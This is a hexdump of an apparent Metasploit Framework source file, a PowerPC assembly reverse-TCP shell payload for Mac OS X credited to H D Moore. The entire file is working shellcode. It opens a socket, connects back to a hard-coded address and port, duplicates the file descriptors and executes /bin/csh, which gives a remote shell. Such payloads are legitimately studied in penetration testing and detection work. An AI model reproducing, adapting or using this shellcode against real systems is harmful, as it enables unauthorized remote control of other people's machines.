00000000  3b 3b 0d 0a 3b 0d 0a 3b  20 20 20 20 20 20 20 20  |;;..;..;        |
00000010  4e 61 6d 65 3a 20 73 69  6e 67 6c 65 5f 72 65 76  |Name: single_rev|
00000020  65 72 73 65 5f 74 63 70  0d 0a 3b 20 20 20 51 75  |erse_tcp..;   Qu|
00000030  61 6c 69 74 69 65 73 3a  20 43 61 6e 20 48 61 76  |alities: Can Hav|
00000040  65 20 4e 75 6c 6c 73 0d  0a 3b 20 20 20 50 6c 61  |e Nulls..;   Pla|
00000050  74 66 6f 72 6d 73 3a 20  4d 61 63 4f 53 20 58 20  |tforms: MacOS X |
00000060  2f 20 50 50 43 0d 0a 3b  20 20 20 20 20 41 75 74  |/ PPC..;     Aut|
00000070  68 6f 72 73 3a 20 48 20  44 20 4d 6f 6f 72 65 20  |hors: H D Moore |
00000080  3c 20 68 64 6d 20 5b 61  74 5d 20 6d 65 74 61 73  |< hdm [at] metas|
00000090  70 6c 6f 69 74 2e 63 6f  6d 20 3e 0d 0a 3b 20 20  |ploit.com >..;  |
000000a0  20 20 20 56 65 72 73 69  6f 6e 3a 20 24 52 65 76  |   Version: $Rev|
000000b0  69 73 69 6f 6e 3a 20 31  2e 31 20 24 0d 0a 3b 20  |ision: 1.1 $..; |
000000c0  20 20 20 20 4c 69 63 65  6e 73 65 3a 0d 0a 3b 0d  |    License:..;.|
000000d0  0a 3b 20 20 20 20 20 20  20 20 54 68 69 73 20 66  |.;        This f|
000000e0  69 6c 65 20 69 73 20 70  61 72 74 20 6f 66 20 74  |ile is part of t|
000000f0  68 65 20 4d 65 74 61 73  70 6c 6f 69 74 20 45 78  |he Metasploit Ex|
00000100  70 6c 6f 69 74 20 46 72  61 6d 65 77 6f 72 6b 0d  |ploit Framework.|
00000110  0a 3b 20 20 20 20 20 20  20 20 61 6e 64 20 69 73  |.;        and is|
00000120  20 73 75 62 6a 65 63 74  20 74 6f 20 74 68 65 20  | subject to the |
00000130  73 61 6d 65 20 6c 69 63  65 6e 73 65 73 20 61 6e  |same licenses an|
00000140  64 20 63 6f 70 79 72 69  67 68 74 73 20 61 73 0d  |d copyrights as.|
00000150  0a 3b 20 20 20 20 20 20  20 20 74 68 65 20 72 65  |.;        the re|
00000160  73 74 20 6f 66 20 74 68  69 73 20 70 61 63 6b 61  |st of this packa|
00000170  67 65 2e 0d 0a 3b 0d 0a  3b 20 44 65 73 63 72 69  |ge...;..; Descri|
00000180  70 74 69 6f 6e 3a 0d 0a  3b 0d 0a 3b 20 20 20 20  |ption:..;..;    |
00000190  20 20 20 20 43 6f 6e 6e  65 63 74 20 62 61 63 6b  |    Connect back|
000001a0  20 61 6e 64 20 73 70 61  77 6e 20 61 20 73 68 65  | and spawn a she|
000001b0  6c 6c 0d 0a 3b 0d 0a 3b  0d 0a 3b 3b 0d 0a 0d 0a  |ll..;..;..;;....|
000001c0  2e 67 6c 6f 62 6c 20 5f  6d 61 69 6e 0d 0a 2e 74  |.globl _main...t|
000001d0  65 78 74 0d 0a 5f 6d 61  69 6e 3a 0d 0a 09 3b 3b  |ext.._main:...;;|
000001e0  20 73 6f 63 6b 65 74 0d  0a 09 6c 69 20 20 20 20  | socket...li    |
000001f0  20 20 72 33 2c 20 32 0d  0a 20 20 20 20 6c 69 20  |  r3, 2..    li |
00000200  20 20 20 20 20 72 34 2c  20 31 0d 0a 20 20 20 20  |     r4, 1..    |
00000210  6c 69 20 20 20 20 20 20  72 35 2c 20 36 0d 0a 20  |li      r5, 6.. |
00000220  20 20 20 6c 69 20 20 20  20 20 20 72 30 2c 20 39  |   li      r0, 9|
00000230  37 0d 0a 20 20 20 20 73  63 0d 0a 20 20 20 20 78  |7..    sc..    x|
00000240  6f 72 20 20 20 20 20 72  30 2c 20 72 30 2c 20 72  |or     r0, r0, r|
00000250  30 0d 0a 20 20 20 20 6d  72 20 20 20 20 20 20 72  |0..    mr      r|
00000260  33 30 2c 20 72 33 0d 0a  0d 0a 20 20 20 20 62 6c  |30, r3....    bl|
00000270  09 09 5f 63 6f 6e 6e 65  63 74 0d 0a 20 20 20 20  |.._connect..    |
00000280  2e 6c 6f 6e 67 20 09 30  78 30 30 30 32 32 32 31  |.long .0x0002221|
00000290  31 0d 0a 20 20 20 20 2e  6c 6f 6e 67 20 09 30 78  |1..    .long .0x|
000002a0  37 66 30 30 30 30 30 31  0d 0a 0d 0a 5f 63 6f 6e  |7f000001...._con|
000002b0  6e 65 63 74 3a 0d 0a 20  20 20 20 6d 66 6c 72 20  |nect:..    mflr |
000002c0  20 20 20 72 34 0d 0a 20  20 20 20 6c 69 20 20 20  |   r4..    li   |
000002d0  20 20 20 72 35 2c 20 30  78 31 30 0d 0a 20 20 20  |   r5, 0x10..   |
000002e0  20 6c 69 20 20 20 20 20  20 72 30 2c 20 39 38 0d  | li      r0, 98.|
000002f0  0a 20 20 20 20 6d 72 20  20 20 20 20 20 72 33 2c  |.    mr      r3,|
00000300  20 72 33 30 0d 0a 20 20  20 20 73 63 0d 0a 09 78  | r30..    sc...x|
00000310  6f 72 2e 09 72 35 2c 20  72 35 2c 20 72 35 0d 0a  |or..r5, r5, r5..|
00000320  0d 0a 5f 73 65 74 75 70  5f 64 75 70 32 3a 0d 0a  |.._setup_dup2:..|
00000330  09 6c 69 20 20 20 20 20  20 72 35 2c 20 32 0d 0a  |.li      r5, 2..|
00000340  0d 0a 5f 64 75 70 32 3a  0d 0a 20 20 20 20 6c 69  |.._dup2:..    li|
00000350  20 20 20 20 20 20 72 30  2c 20 39 30 0d 0a 20 20  |      r0, 90..  |
00000360  20 20 6d 72 20 20 20 20  20 20 72 33 2c 20 72 33  |  mr      r3, r3|
00000370  30 0d 0a 20 20 20 20 6d  72 20 20 20 20 20 20 72  |0..    mr      r|
00000380  34 2c 20 72 35 0d 0a 20  20 20 20 73 63 0d 0a 20  |4, r5..    sc.. |
00000390  20 20 20 78 6f 72 20 20  20 20 20 72 30 2c 20 72  |   xor     r0, r|
000003a0  30 2c 20 72 30 0d 0a 20  20 20 20 73 75 62 69 20  |0, r0..    subi |
000003b0  20 20 20 72 35 2c 20 72  35 2c 20 31 0d 0a 20 20  |   r5, r5, 1..  |
000003c0  20 20 63 6d 70 77 69 20  20 20 72 35 2c 20 2d 31  |  cmpwi   r5, -1|
000003d0  0d 0a 20 20 20 20 62 6e  65 6c 20 20 20 20 5f 64  |..    bnel    _d|
000003e0  75 70 32 0d 0a 0d 0a 5f  66 6f 72 6b 3a 0d 0a 20  |up2...._fork:.. |
000003f0  20 20 20 6c 69 20 20 20  20 20 20 72 30 2c 20 32  |   li      r0, 2|
00000400  0d 0a 20 20 20 20 73 63  0d 0a 09 78 6f 72 2e 09  |..    sc...xor..|
00000410  72 35 2c 20 72 35 2c 20  72 35 0d 0a 0d 0a 5f 65  |r5, r5, r5...._e|
00000420  78 65 63 73 68 3a 0d 0a  20 20 20 20 78 6f 72 2e  |xecsh:..    xor.|
00000430  20 20 20 20 72 35 2c 20  72 35 2c 20 72 35 0d 0a  |    r5, r5, r5..|
00000440  20 20 20 20 62 6e 65 6c  20 20 20 20 5f 65 78 65  |    bnel    _exe|
00000450  63 73 68 0d 0a 20 20 20  20 6d 66 6c 72 20 20 20  |csh..    mflr   |
00000460  20 72 33 0d 0a 20 20 20  20 61 64 64 69 20 20 20  | r3..    addi   |
00000470  20 72 33 2c 20 72 33 2c  20 32 38 0d 0a 20 20 20  | r3, r3, 28..   |
00000480  20 73 74 77 20 20 20 20  20 72 33 2c 20 2d 38 28  | stw     r3, -8(|
00000490  72 31 29 20 20 20 20 20  20 3b 20 61 72 67 76 5b  |r1)      ; argv[|
000004a0  30 5d 20 3d 20 70 61 74  68 0d 0a 20 20 20 20 73  |0] = path..    s|
000004b0  74 77 20 20 20 20 20 72  35 2c 20 2d 34 28 72 31  |tw     r5, -4(r1|
000004c0  29 20 20 20 20 20 20 3b  20 61 72 67 76 5b 31 5d  |)      ; argv[1]|
000004d0  20 3d 20 4e 55 4c 4c 0d  0a 20 20 20 20 73 75 62  | = NULL..    sub|
000004e0  69 20 20 20 20 72 34 2c  20 72 31 2c 20 38 20 20  |i    r4, r1, 8  |
000004f0  20 20 20 20 20 3b 20 72  34 20 3d 20 7b 70 61 74  |     ; r4 = {pat|
00000500  68 2c 20 30 7d 0d 0a 20  20 20 20 6c 69 20 20 20  |h, 0}..    li   |
00000510  20 20 20 72 30 2c 20 35  39 0d 0a 20 20 20 20 73  |   r0, 59..    s|
00000520  63 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |c               |
00000530  20 20 20 20 20 20 20 3b  20 65 78 65 63 76 65 28  |       ; execve(|
00000540  70 61 74 68 2c 20 61 72  67 76 2c 20 4e 55 4c 4c  |path, argv, NULL|
00000550  29 0d 0a 0d 0a 3b 20 63  73 68 20 72 65 6d 6f 76  |)....; csh remov|
00000560  65 73 20 74 68 65 20 6e  65 65 64 20 66 6f 72 20  |es the need for |
00000570  73 65 74 75 69 64 28 29  0d 0a 70 61 74 68 3a 0d  |setuid()..path:.|
00000580  0a 09 2e 61 73 63 69 69  20 20 22 2f 62 69 6e 2f  |...ascii  "/bin/|
00000590  63 73 68 22 0d 0a 09 2e  6c 6f 6e 67 20 20 20 30  |csh"....long   0|
000005a0  78 30 30 34 31 34 32 34  33                       |x00414243|
000005a9
